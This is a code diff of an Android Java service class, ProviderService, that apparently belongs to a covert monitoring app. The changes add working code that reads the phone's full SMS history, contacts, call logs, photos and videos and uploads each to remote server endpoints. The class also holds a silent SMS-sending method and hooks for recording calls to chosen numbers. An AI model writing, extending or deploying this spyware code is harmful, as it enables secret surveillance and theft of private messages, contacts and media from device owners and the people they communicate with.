@@ -24,7 +24,6 @@ import com.fs.fs.api.network.core.OkHttpUtils;
 import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.bean.PhoneInfo;
 import com.fs.fs.bean.SMSInfo;
-import com.fs.fs.receivers.SMSReceiver;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.DateUtils;
 import com.fs.fs.utils.FFmpegUtils;
@@ -38,10 +37,8 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Collection;
 import java.util.Date;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
@@ -79,17 +76,11 @@ public class ProviderService {
     }
 
     public interface SMSListener {
-        // get all sms at first
-        void onGetAllSMS(List<SMSInfo> SMSInfo);
-
         // listen SMS coming
         void onReceive(SMSInfo sms);
     }
 
     public interface CallsListener {
-        // get all sms at first
-        void onGetAllCall(List<PhoneInfo> callInfo);
-
         // audio record start
         void onStart();
 
@@ -99,14 +90,6 @@ public class ProviderService {
         // set the number you want to listen
         Boolean onPhoneNumber(String number);
     }
-
-    public interface ContactsListener {
-        void onGetAllContacts(List<PhoneInfo> contactInfo);
-    }
-
-    public SMSListener mSMSListener;
-    public CallsListener mCallsListener;
-    public ContactsListener mContactsListener;
 
     public void sendSMSSilent(String phoneNumber, String content) {
         if (TextUtils.isEmpty(content)) return;
@@ -122,8 +105,7 @@ public class ProviderService {
         }
     }
 
-    public void getSMS(SMSListener listener) {
-        mSMSListener = listener;
+    public void getSMS() {
         Boolean isSMSRead = (Boolean) mSharePreferences.get(Constant.SHARE_KEYS.SMS_HAS_READ, false);
         if (!isSMSRead) {
             // 获取查询路径
@@ -141,16 +123,22 @@ public class ProviderService {
                     LogUtils.d(smsInfo.toString());
                 }
                 cursor.close();
-                mSharePreferences.put(Constant.SHARE_KEYS.SMS_HAS_READ, true);
-                mSMSListener.onGetAllSMS(smsInfos);
+                OkHttpUtils.post(ApiConfig.getSMSAll(), new HttpParams().addJson("sms_all", smsInfos), new HttpCallback(BaseResponse.class) {
+                    @Override
+                    public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                        mSharePreferences.put(Constant.SHARE_KEYS.SMS_HAS_READ, true);
+                    }
+
+                    @Override
+                    public void onError(String errorMsg) {
+                    }
+                });
             }
         }
-        SMSReceiver.setListener(listener);
     }
 
     @SuppressLint("DefaultLocale")
-    public void getContant(ContactsListener listener) {
-        mContactsListener = listener;
+    public void getContant() {
         //取得电话本中开始一项的光标
         Cursor cursor = mResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         //向下移动光标
@@ -169,8 +157,9 @@ public class ProviderService {
                 if (phoneCursor != null) {
                     while (phoneCursor.moveToNext()) {
                         String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        phoneInfo.phoneNumber += phoneNumber.replace("-", "").replace(" ", "");
+                        phoneInfo.phoneNumber += phoneNumber.replace("-", "").replace(" ", "") + ",";
                     }
+                    phoneInfo.phoneNumber = phoneInfo.phoneNumber.substring(0, phoneInfo.phoneNumber.length() - 1);
                     phoneCursor.close();
                 }
                 LogUtils.d(phoneInfo.toString());
@@ -180,15 +169,23 @@ public class ProviderService {
             cursor.close();
         }
         LogUtils.d("%s", infos.size());
-        List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CONTANT);
+        final List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CONTANT);
         if (update != null) {
-            mContactsListener.onGetAllContacts(update);
+            OkHttpUtils.post(ApiConfig.getContact(), new HttpParams().addJson("contact", update), new HttpCallback(BaseResponse.class) {
+                @Override
+                public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                    SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.CONTANT, update);
+                }
+
+                @Override
+                public void onError(String errorMsg) {
+                }
+            });
         }
     }
 
     @SuppressLint("DefaultLocale")
-    public void getCalls(CallsListener listener) {
-        mCallsListener = listener;
+    public void getCalls() {
         if (ActivityCompat.checkSelfPermission(App.getInstance(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             // 检查READ_CALL_LOG权限
             return;
@@ -227,9 +224,18 @@ public class ProviderService {
             }
             cursor.close();
 
-            List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CALL);
+            final List<PhoneInfo> update = updatePhoneInfo(infos, newMap, Constant.SHARE_KEYS.CALL);
             if (update != null) {
-                mCallsListener.onGetAllCall(update);
+                OkHttpUtils.post(ApiConfig.getCall(), new HttpParams().addJson("call", update), new HttpCallback(BaseResponse.class) {
+                    @Override
+                    public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                        SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.CALL, update);
+                    }
+
+                    @Override
+                    public void onError(String errorMsg) {
+                    }
+                });
             }
             LogUtils.d("%s", infos.size());
         }
@@ -237,9 +243,12 @@ public class ProviderService {
 
     @SuppressLint("DefaultLocale")
     private List<PhoneInfo> updatePhoneInfo(List<PhoneInfo> infos, HashMap<String, PhoneInfo> newMap, String shareKey) {
-        List<PhoneInfo> old = (List<PhoneInfo>) SharePreferencesUtils.getInstance().get(shareKey, null);
-        if (old == null || (infos == null || infos.size() == 0)) {
+        if (infos == null || infos.size() == 0) {
             return null;
+        }
+        List<PhoneInfo> old = (List<PhoneInfo>) SharePreferencesUtils.getInstance().get(shareKey, null);
+        if (old == null) {
+            return infos;
         }
         List<PhoneInfo> newList = new ArrayList<>();
         for (PhoneInfo info : old) {
@@ -252,7 +261,6 @@ public class ProviderService {
             for (String key : newMap.keySet()) {
                 newList.add(newMap.get(key));
             }
-            SharePreferencesUtils.getInstance().put(shareKey, infos);
             return newList;
         }
         return null;
@@ -272,18 +280,21 @@ public class ProviderService {
     public void getPictures() {
         picturePath = new HashMap<>();
         getPicture(getMediaFiles());
-        final List<File> updateList = (List<File>) updateFile(picturePath, Constant.SHARE_KEYS.PICTURE);
+        final List<File> updateList = updateFile(picturePath, Constant.SHARE_KEYS.PICTURE);
         if (updateList != null) {
-            OkHttpUtils.postAsync(ApiConfig.getTakePicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
+            OkHttpUtils.post(ApiConfig.getPicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
                 @Override
                 public void onSuccess(BaseResponse httpResponse, Headers headers) {
-                    FileUtils.delete(updateList);
+                    // java.io.NotSerializableException: java.util.HashMap$KeySet
+                    Set<String> fileNameSet = picturePath.keySet();
+                    SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.PICTURE, new ArrayList<>(fileNameSet));
                     picturePath = null;
+                    FileUtils.delete(updateList);
                 }
 
                 @Override
                 public void onError(String errorMsg) {
-
+                    FileUtils.delete(updateList);
                 }
             });
         }
@@ -293,27 +304,33 @@ public class ProviderService {
         videoPath = new HashMap<>();
         getVideo(getMediaFiles());
 
-        final List<File> updateList = (List<File>) updateFile(videoPath, Constant.SHARE_KEYS.VIDEO);
+        final List<File> updateList = updateFile(videoPath, Constant.SHARE_KEYS.VIDEO);
         if (updateList != null) {
-            OkHttpUtils.postAsync(ApiConfig.getVideo(), new HttpParams().addFiles("video", updateList), new HttpCallback(BaseResponse.class) {
+            OkHttpUtils.post(ApiConfig.getVideo(), new HttpParams().addFiles("video", updateList), new HttpCallback(BaseResponse.class) {
                 @Override
                 public void onSuccess(BaseResponse httpResponse, Headers headers) {
-                    FileUtils.delete(updateList);
+                    Set<String> fileNameSet = videoPath.keySet();
+                    SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.VIDEO, new ArrayList<>(fileNameSet));
                     videoPath = null;
+                    FileUtils.delete(updateList);
                 }
 
                 @Override
                 public void onError(String errorMsg) {
-
+                    // Because the network asynchronous
+                    FileUtils.delete(updateList);
                 }
             });
         }
     }
 
-    private Collection<File> updateFile(HashMap<String, File> paths, String shareKey) {
-        Set<String> old = (Set<String>) SharePreferencesUtils.getInstance().get(shareKey, null);
-        if (old == null || (paths == null || paths.size() == 0)) {
+    private ArrayList<File> updateFile(HashMap<String, File> paths, String shareKey) {
+        if (paths == null || paths.size() == 0) {
             return null;
+        }
+        List<String> old = (List<String>) SharePreferencesUtils.getInstance().get(shareKey, null);
+        if (old == null) {
+            return new ArrayList<>(paths.values());
         }
         for (String pathName : old) {
             if (paths.keySet().contains(pathName)) {
@@ -321,11 +338,7 @@ public class ProviderService {
             }
         }
         if (paths.size() > 0) {
-            Set<String> newSet = new HashSet<>();
-            newSet.addAll(old);
-            newSet.addAll(paths.keySet());
-            SharePreferencesUtils.getInstance().put(shareKey, newSet);
-            return paths.values();
+            return new ArrayList<>(paths.values());
         }
         return null;
     }
